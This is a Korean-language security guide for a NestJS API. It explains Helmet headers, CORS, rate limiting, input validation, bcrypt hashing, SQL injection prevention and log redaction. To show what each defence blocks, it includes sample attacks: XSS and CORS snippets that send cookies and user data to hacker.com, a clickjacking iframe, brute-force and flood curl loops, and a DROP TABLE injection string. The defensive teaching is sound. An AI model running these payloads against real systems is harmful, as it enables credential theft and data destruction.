# 보안 가이드 (Security Guide)

## 개요

본 프로젝트는 **엔터프라이즈급 보안**을 위해 다층 방어 전략(Defense in Depth)을 적용합니다.

```
┌─────────────────────────────────────────────────────┐
│  1. Network Layer (Helmet, CORS, Rate Limiting)    │
├─────────────────────────────────────────────────────┤
│  2. Authentication (JWT, bcrypt)                    │
├─────────────────────────────────────────────────────┤
│  3. Authorization (RBAC, Guards)                    │
├─────────────────────────────────────────────────────┤
│  4. Input Validation (class-validator, DTO)         │
├─────────────────────────────────────────────────────┤
│  5. Data Protection (Parameterized Query, 암호화)   │
├─────────────────────────────────────────────────────┤
│  6. Monitoring & Logging (구조화된 로그, 감사)       │
└─────────────────────────────────────────────────────┘
```

## 1. Helmet - HTTP 보안 헤더

### 1.1 Helmet이란?

**Helmet은 Express/NestJS 애플리케이션의 HTTP 보안 헤더를 자동으로 설정하는 미들웨어 모음**입니다.

```typescript
// apps/api/src/main.ts
import helmet from 'helmet';

app.use(helmet());
```

**왜 필요한가?**
- 웹 브라우저는 HTTP 응답 헤더를 보고 보안 정책을 적용
- 기본 설정으로는 많은 보안 취약점이 노출됨
- Helmet은 **한 줄의 코드로 11개 이상의 보안 헤더 자동 설정**

### 1.2 Helmet이 설정하는 보안 헤더

#### 1️⃣ Content-Security-Policy (CSP)

**목적**: XSS (Cross-Site Scripting) 공격 방지

```http
Content-Security-Policy: default-src 'self';
```

**동작 원리:**
- 브라우저에게 "어떤 리소스를 어디서 로드할 수 있는지" 지시
- 인라인 스크립트 실행 차단
- 외부 도메인 리소스 로드 제한

**예시 공격 시나리오 (CSP 없이):**
```html
<!-- 악성 사용자가 댓글에 스크립트 삽입 -->
<script>
  // 사용자의 쿠키를 탈취하여 외부로 전송
  fetch('https://hacker.com/steal?cookie=' + document.cookie);
</script>
```

**Helmet 적용 시:**
- 브라우저가 인라인 스크립트 실행 차단 → 공격 실패 ✅

**커스터마이징 (필요 시):**
```typescript
app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "'unsafe-inline'"], // 인라인 허용 (주의)
        imgSrc: ["'self'", 'data:', 'https:'],
        connectSrc: ["'self'", 'https://api.example.com'],
      },
    },
  })
);
```

#### 2️⃣ X-Content-Type-Options

**목적**: MIME 타입 스니핑 공격 방지

```http
X-Content-Type-Options: nosniff
```

**동작 원리:**
- 브라우저가 응답의 `Content-Type` 헤더를 무시하고 내용을 분석하는 것을 차단
- 예: `text/html`로 선언했는데 실제로는 JavaScript인 경우 실행 차단

**예시 공격 시나리오:**
```javascript
// 악성 사용자가 이미지 업로드 기능을 악용
// 파일명: image.jpg
// 실제 내용: <script>alert('XSS')</script>

// 브라우저가 파일 내용을 보고 JavaScript로 인식 → 실행 (❌)
```

**Helmet 적용 시:**
- `Content-Type: image/jpeg`이면 무조건 이미지로만 처리 → 스크립트 실행 차단 ✅

#### 3️⃣ X-Frame-Options

**목적**: 클릭재킹(Clickjacking) 공격 방지

```http
X-Frame-Options: DENY
```

**동작 원리:**
- 다른 사이트에서 `<iframe>`으로 우리 페이지를 포함하는 것을 차단

**예시 공격 시나리오:**
```html
<!-- 악성 사이트 (hacker.com) -->
<iframe src="https://our-app.com/transfer-money" style="opacity: 0;"></iframe>
<button style="position: absolute; top: 100px; left: 100px;">
  무료 아이폰 받기!
</button>

<!-- 사용자가 버튼 클릭 → 실제로는 iframe 내부의 송금 버튼 클릭 (❌) -->
```

**Helmet 적용 시:**
- 브라우저가 iframe 로딩 차단 → 공격 실패 ✅

**설정 옵션:**
- `DENY`: 모든 iframe 차단
- `SAMEORIGIN`: 같은 도메인에서만 허용
- `ALLOW-FROM https://trusted.com`: 특정 도메인만 허용

#### 4️⃣ Strict-Transport-Security (HSTS)

**목적**: HTTPS 강제 사용, 중간자 공격(MITM) 방지

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**동작 원리:**
- 브라우저에게 "앞으로 1년간 이 도메인은 무조건 HTTPS로만 접속" 명령
- HTTP로 접속 시도 시 브라우저가 자동으로 HTTPS로 변환

**예시 공격 시나리오:**
```
1. 사용자가 카페 WiFi 사용
2. http://our-app.com 접속 시도
3. 해커가 WiFi 라우터 조작하여 가짜 사이트로 리다이렉트
4. 사용자의 로그인 정보 탈취 (❌)
```

**Helmet 적용 시:**
- 브라우저가 HTTP 접속을 자동으로 HTTPS로 변환
- 인증서 불일치 시 경고 표시 → 공격 차단 ✅

**프로덕션 설정:**
```typescript
app.use(
  helmet({
    hsts: {
      maxAge: 31536000, // 1년 (초 단위)
      includeSubDomains: true, // 서브도메인 포함
      preload: true, // HSTS Preload 목록 등록
    },
  })
);
```

#### 5️⃣ X-XSS-Protection

**목적**: 브라우저 내장 XSS 필터 활성화 (구형 브라우저용)

```http
X-XSS-Protection: 1; mode=block
```

**왜 중요한가?**
- 최신 브라우저는 CSP 사용
- IE11, Safari 같은 구형 브라우저는 이 헤더 의존

#### 6️⃣ Referrer-Policy

**목적**: Referer 헤더 정보 유출 방지

```http
Referrer-Policy: no-referrer
```

**예시 문제 상황:**
```
사용자가 https://our-app.com/dashboard?token=secret123 접속
↓
외부 링크 클릭 (https://external-site.com)
↓
Referer 헤더에 토큰 포함 전송 → 정보 유출 (❌)
```

**Helmet 적용 시:**
- `no-referrer` 또는 `same-origin` 설정 → 외부 사이트에 정보 전송 차단 ✅

#### 7️⃣ Permissions-Policy (구 Feature-Policy)

**목적**: 브라우저 기능(카메라, 마이크, 위치 등) 사용 제한

```http
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

**왜 필요한가?**
- 악성 스크립트가 카메라/마이크 접근 방지
- 위치 정보 무단 수집 차단

### 1.3 Helmet 커스터마이징

**기본 설정 (현재 적용 중):**
```typescript
// apps/api/src/main.ts:63
app.use(helmet());
```

**커스터마이징 예시 (필요 시):**
```typescript
import helmet from 'helmet';

app.use(
  helmet({
    // Content Security Policy
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'", "https://cdn.jsdelivr.net"],
        styleSrc: ["'self'", "'unsafe-inline'"], // Swagger 때문에 필요
        imgSrc: ["'self'", 'data:', 'https:'],
      },
    },

    // HSTS (프로덕션만)
    hsts: process.env.NODE_ENV === 'production' ? {
      maxAge: 31536000,
      includeSubDomains: true,
      preload: true,
    } : false,

    // Frame 옵션
    frameguard: {
      action: 'deny', // 또는 'sameorigin'
    },
  })
);
```

### 1.4 Helmet 비활성화가 필요한 경우

**Swagger 사용 시 CSP 완화:**
```typescript
// Swagger는 인라인 스타일 사용
app.use(
  helmet({
    contentSecurityPolicy: process.env.NODE_ENV === 'production' ? undefined : false,
  })
);
```

**왜 이렇게 하는가?**
- Swagger UI는 인라인 CSS/JS 사용
- 개발 환경: CSP 비활성화 (편의성)
- 프로덕션: CSP 활성화 + Swagger 비활성화 (보안)

## 2. CORS (Cross-Origin Resource Sharing)

### 2.1 CORS란?

**CORS는 다른 도메인의 웹 페이지가 API에 접근하는 것을 제어하는 보안 메커니즘**입니다.

```typescript
// apps/api/src/main.ts:66-69
app.enableCors({
  origin: configService.get<string>('CORS_ORIGIN', 'http://localhost:13000'),
  credentials: true,
});
```

### 2.2 왜 필요한가?

**예시 공격 시나리오 (CORS 없이):**
```javascript
// 악성 사이트 (evil.com)
fetch('https://our-app.com/api/v1/users/me', {
  credentials: 'include' // 쿠키 포함
})
.then(res => res.json())
.then(data => {
  // 사용자 정보 탈취 → 외부로 전송 (❌)
  fetch('https://hacker.com/steal', { method: 'POST', body: JSON.stringify(data) });
});
```

**CORS 적용 시:**
- 브라우저가 `Origin` 헤더 확인
- 허용된 도메인이 아니면 요청 차단 ✅

### 2.3 설정 상세

```typescript
app.enableCors({
  // 허용할 도메인 (환경변수로 관리)
  origin: [
    'http://localhost:13000',  // 개발: 프론트엔드
    'https://app.example.com', // 프로덕션: 프론트엔드
  ],

  // 쿠키/인증 정보 포함 허용
  credentials: true,

  // 허용할 HTTP 메서드
  methods: ['GET', 'POST', 'PUT', 'PATCH', 'DELETE', 'OPTIONS'],

  // 허용할 헤더
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Request-ID'],

  // 응답 헤더 노출
  exposedHeaders: ['X-Total-Count', 'X-Request-ID'],

  // Preflight 캐시 시간 (초)
  maxAge: 3600,
});
```

### 2.4 동적 Origin 허용 (멀티 도메인)

```typescript
app.enableCors({
  origin: (origin, callback) => {
    const allowedOrigins = [
      'http://localhost:13000',
      'https://app.example.com',
      'https://admin.example.com',
    ];

    // Origin이 없으면 허용 (Postman, curl 등)
    if (!origin) return callback(null, true);

    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error('CORS 정책 위반'));
    }
  },
  credentials: true,
});
```

## 3. Rate Limiting (요청 속도 제한)

### 3.1 Rate Limiting이란?

**특정 시간 동안 IP별로 API 요청 횟수를 제한하여 DDoS, Brute Force 공격 방지**

```typescript
// apps/api/src/app.module.ts
ThrottlerModule.forRoot([
  {
    ttl: 60000,  // 60초
    limit: 100,  // 100번
  },
]),
```

### 3.2 왜 필요한가?

**공격 시나리오:**

1. **Brute Force 공격:**
   ```bash
   # 비밀번호 무차별 대입
   for i in {1..10000}; do
     curl -X POST /api/v1/users/login -d "email=admin@example.com&password=pass$i"
   done
   ```

   **Rate Limiting 적용 시:**
   - 60초에 100번 이상 요청 시 `429 Too Many Requests` 반환 ✅

2. **DDoS 공격:**
   ```bash
   # 서버 과부하 유도
   while true; do
     curl https://our-app.com/api/v1/expensive-query
   done
   ```

   **Rate Limiting 적용 시:**
   - IP당 요청 제한으로 서버 리소스 보호 ✅

### 3.3 커스터마이징

```typescript
import { ThrottlerGuard, ThrottlerModule } from '@nestjs/throttler';

// 전역 설정
ThrottlerModule.forRoot([
  {
    name: 'short',
    ttl: 1000,   // 1초
    limit: 3,    // 3번
  },
  {
    name: 'medium',
    ttl: 10000,  // 10초
    limit: 20,   // 20번
  },
  {
    name: 'long',
    ttl: 60000,  // 60초
    limit: 100,  // 100번
  },
]),

// 특정 엔드포인트만 제한
@UseGuards(ThrottlerGuard)
@Throttle({ short: { limit: 5, ttl: 60000 } }) // 60초에 5번
@Post('login')
async login() { ... }

// 특정 엔드포인트 제외
@SkipThrottle()
@Get('health')
async health() { ... }
```

## 4. Input Validation (입력 검증)

### 4.1 class-validator + DTO

**모든 API 입력은 DTO(Data Transfer Object)로 검증**

```typescript
// CreateUserDto
export class CreateUserDto {
  @ApiProperty({ example: 'user@example.com' })
  @IsEmail({}, { message: '올바른 이메일 형식이 아닙니다' })
  @Transform(({ value }) => value.toLowerCase().trim())
  email: string;

  @ApiProperty({ example: 'SecurePass123!' })
  @IsString()
  @MinLength(8, { message: '비밀번호는 최소 8자 이상이어야 합니다' })
  @Matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)/, {
    message: '비밀번호는 대문자, 소문자, 숫자를 포함해야 합니다',
  })
  password: string;
}
```

### 4.2 ValidationPipe 전역 설정

```typescript
// apps/api/src/main.ts:79-90
app.useGlobalPipes(
  new ValidationPipe({
    whitelist: true,             // DTO에 없는 속성 제거
    forbidNonWhitelisted: true,  // 알 수 없는 속성 있으면 요청 거부
    transform: true,             // 타입 자동 변환 (string → number)
    disableErrorMessages: false, // 상세 에러 메시지
  }),
);
```

**왜 `whitelist: true`가 중요한가?**

```typescript
// 공격 시나리오 (whitelist 없이)
POST /api/v1/users/register
{
  "email": "user@example.com",
  "password": "pass123",
  "role": "ADMIN"  // ← 악의적 속성 주입 (❌)
}

// ValidationPipe whitelist: true 적용 시
// → role 속성 자동 제거 → 일반 사용자로 생성 ✅
```

## 5. Authentication & Authorization

### 5.1 비밀번호 해싱 (bcrypt)

**절대 평문 비밀번호를 저장하지 않음**

```typescript
// apps/api/src/modules/user/application/services/user.service.ts
import * as bcrypt from 'bcrypt';

private readonly BCRYPT_SALT_ROUNDS = 12;

// 회원가입 시 해싱
const hashedPassword = await bcrypt.hash(dto.password, this.BCRYPT_SALT_ROUNDS);

// 로그인 시 검증
const isPasswordValid = await bcrypt.compare(plainPassword, user.password);
```

**왜 bcrypt인가?**
- **Slow by Design**: 의도적으로 느림 → Brute Force 공격 어렵게
- **Salt 자동 생성**: 같은 비밀번호도 다른 해시값
- **Adaptive**: Salt Rounds 증가로 미래 하드웨어 대응

**Salt Rounds 선택 근거:**
| Rounds | 시간 (1개 해싱) | 시간 (1000개 Brute Force) | 보안 수준 |
|--------|----------------|---------------------------|----------|
| 10     | ~100ms         | ~100초                     | 일반     |
| 12     | ~250ms         | ~250초                     | **권장** |
| 14     | ~1초           | ~1000초                    | 높음     |

**우리의 선택: 12 Rounds**
- 사용자 경험: 250ms는 허용 가능 (로그인 1번)
- 공격자 비용: 1000개 시도 시 250초 소요 (충분히 느림)

### 5.2 JWT (JSON Web Token)

**현재 미구현 - 향후 추가 예정**

```typescript
// 예정된 구현
@Injectable()
export class AuthService {
  async login(user: User) {
    const payload = { sub: user.id, email: user.email, role: user.role };

    return {
      accessToken: this.jwtService.sign(payload, { expiresIn: '15m' }),
      refreshToken: this.jwtService.sign(payload, { expiresIn: '7d' }),
    };
  }
}
```

**보안 원칙:**
- Access Token: 짧은 만료 시간 (15분)
- Refresh Token: HttpOnly 쿠키 저장 (XSS 방지)
- Token Rotation: 사용 시마다 재발급

### 5.3 RBAC (Role-Based Access Control)

```typescript
// 역할 기반 접근 제어
@UseGuards(JwtAuthGuard, RolesGuard)
@Roles('ADMIN', 'OWNER')
@Delete('users/:id')
async deleteUser(@Param('id') id: string) { ... }
```

## 6. SQL Injection 방지

### 6.1 Parameterized Query (파라미터 바인딩)

**✅ 올바른 예 (Prisma):**
```typescript
const user = await prisma.user.findUnique({
  where: { email: userInput.email } // 자동으로 파라미터 바인딩
});
```

**✅ 올바른 예 (Raw SQL):**
```typescript
const users = await prisma.$queryRaw<User[]>`
  SELECT * FROM users
  WHERE email = ${userInput.email}  -- 파라미터 바인딩 ($1)
`;
```

**❌ 절대 금지 (문자열 결합):**
```typescript
// SQL Injection 취약!
const query = `SELECT * FROM users WHERE email = '${userInput.email}'`;
await prisma.$queryRawUnsafe(query);

// 공격 시나리오:
// userInput.email = "' OR '1'='1'; DROP TABLE users; --"
// → 모든 사용자 조회 + users 테이블 삭제 (❌)
```

### 6.2 Prisma ORM의 자동 보호

Prisma는 기본적으로 모든 쿼리를 파라미터 바인딩 처리 → SQL Injection 원천 차단 ✅

## 7. Logging & Monitoring (로깅 & 모니터링)

### 7.1 민감 정보 제거

```typescript
// apps/api/src/common/interceptors/logging.interceptor.ts
private sanitizeBody(body: any): any {
  const sanitized = { ...body };
  const sensitiveFields = ['password', 'token', 'accessToken', 'refreshToken'];

  sensitiveFields.forEach((field) => {
    if (sanitized[field]) {
      sanitized[field] = '***REDACTED***';
    }
  });

  return sanitized;
}
```

**왜 필요한가?**
- 로그에 비밀번호가 평문으로 남으면 내부자 공격 가능
- 토큰 유출 시 계정 탈취 위험

### 7.2 구조화된 로깅

```typescript
// Winston 로거 사용 (향후)
logger.info('User login', {
  userId: user.id,
  ip: req.ip,
  userAgent: req.headers['user-agent'],
  timestamp: new Date().toISOString(),
});
```

## 8. 보안 체크리스트

### 개발 환경

- [ ] `.env` 파일을 `.gitignore`에 추가
- [ ] 민감한 정보는 환경변수로 관리
- [ ] 개발용 DB와 프로덕션 DB 분리
- [ ] Swagger는 개발 환경만 활성화

### 프로덕션 배포 전

- [ ] Helmet 활성화 확인
- [ ] CORS Origin을 프로덕션 도메인으로 변경
- [ ] HTTPS 적용 (HSTS 활성화)
- [ ] Rate Limiting 설정 확인
- [ ] JWT Secret 강력한 랜덤 값으로 설정
- [ ] 모든 입력에 Validation 적용
- [ ] SQL Injection 테스트
- [ ] XSS 테스트
- [ ] Swagger 비활성화
- [ ] 에러 메시지에 스택 트레이스 제거

### 정기 점검

- [ ] 의존성 취약점 스캔 (`pnpm audit`)
- [ ] 비밀번호 정책 검토
- [ ] 로그 분석 (이상 접근 패턴)
- [ ] 백업 및 복구 테스트

## 9. 보안 테스트 도구

### 9.1 의존성 취약점 스캔

```bash
# npm audit
pnpm audit

# 자동 수정
pnpm audit fix
```

### 9.2 OWASP ZAP (침투 테스트)

```bash
# Docker로 실행
docker run -t owasp/zap2docker-stable zap-baseline.py -t http://localhost:3000
```

### 9.3 SQL Injection 테스트

```bash
# SQLMap 도구
sqlmap -u "http://localhost:3000/api/v1/users?search=test" --batch
```

## 10. 참고 자료

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Helmet.js 공식 문서](https://helmetjs.github.io/)
- [NestJS Security Best Practices](https://docs.nestjs.com/security/helmet)
- [bcrypt 공식 문서](https://github.com/kelektiv/node.bcrypt.js)

---

**마지막 업데이트**: 2025-12-05
**책임자**: Backend Team
**검토 주기**: 분기별 (3개월)
